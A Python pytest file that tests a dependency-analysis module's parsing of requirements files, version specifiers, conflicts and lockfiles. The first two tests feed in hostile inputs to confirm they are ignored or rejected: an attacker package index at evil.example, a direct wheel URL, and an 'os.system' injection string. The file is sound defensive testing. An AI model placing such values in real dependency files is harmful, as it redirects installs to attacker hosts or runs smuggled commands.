import pytest

from aureom_foundry.dependencies.analysis import analyse_dependencies
from aureom_foundry.dependencies.environments import UnsafeRequirement, build_fetch_request, requirement_line
from aureom_foundry.dependencies.parsers import parse_pep508, parse_requirements_txt
from aureom_foundry.dependencies.versions import satisfies, specs_conflict


def test_requirements_options_are_ignored_not_obeyed(tmp_path):
    f = tmp_path / "requirements.txt"
    f.write_text("--index-url https://evil.example/simple\n-e git+https://x/y\n-r other.txt\nrequests==2.31.0 \\\n    --hash=sha256:" + "a" * 64 + "\nflask>=3 ; python_version >= '3.10'\n")
    reqs, problems = parse_requirements_txt(f, "requirements.txt")
    assert [r.name for r in reqs] == ["requests", "flask"]
    assert reqs[0].pinned and reqs[0].hashes
    assert {p.text.split()[0] for p in problems} >= {"--index-url", "-e", "-r"}


@pytest.mark.parametrize("line", ["foo --index-url=https://evil", "foo @ https://evil.example/foo.whl", "foo; os.system('x')"])
def test_requirement_injection_rejected(line):
    r = parse_pep508(line, "requirements.txt")
    with pytest.raises(UnsafeRequirement):
        requirement_line(r)


def test_versions():
    assert satisfies("2.31.0", ">=2,<3")
    assert not satisfies("1.9", ">=2")
    assert satisfies("1.4.2", "~=1.4")
    assert not satisfies("2.0", "~=1.4")
    assert satisfies("3.12.0", ">=3.10")
    assert specs_conflict("==1.0", ">=2")
    assert not specs_conflict(">=1", "<3")


def test_conflicts_and_unsupported_runtime(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname="x"\nversion="1"\nrequires-python=">=3.14"\ndependencies=["requests==2.0"]\n')
    (tmp_path / "requirements.txt").write_text("requests>=2.31\n")
    (tmp_path / "main.py").write_text("import requests\n")
    rep = analyse_dependencies(tmp_path, ["pyproject.toml", "requirements.txt", "main.py"], None, worker_python="3.12")
    codes = {i.code for i in rep.issues}
    assert {"conflicting-requirements", "unsupported-runtime", "no-lockfile"} <= codes


def test_fetch_request_separates_roles(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[build-system]\nrequires=["setuptools>=68"]\n[project]\nname="x"\nversion="1"\ndependencies=["requests>=2"]\n[project.optional-dependencies]\ndev=["pytest>=8"]\nextra=["rich"]\n')
    rep = analyse_dependencies(tmp_path, ["pyproject.toml"], None)
    req = build_fetch_request(rep, need_build_tooling=True, need_tests=True)
    assert req.runtime == ["requests>=2"]  # optional non-dev extras are not installed by default
    assert "pytest>=8" in req.dev and "setuptools>=68" in req.tooling and "build" in req.tooling
    assert req.key("img", "https://pypi.org/simple", True) == build_fetch_request(rep, need_build_tooling=True, need_tests=True).key("img", "https://pypi.org/simple", True)


def test_lockfiles_detected(tmp_path):
    (tmp_path / "poetry.lock").write_text("")
    (tmp_path / "package.json").write_text('{"dependencies": {"left-pad": "^1.3.0"}}')
    (tmp_path / "package-lock.json").write_text("{}")
    rep = analyse_dependencies(tmp_path, ["poetry.lock", "package.json", "package-lock.json"], None)
    assert set(rep.lockfiles) == {"poetry.lock", "package-lock.json"}
    assert any(r.ecosystem == "node" for r in rep.requirements)
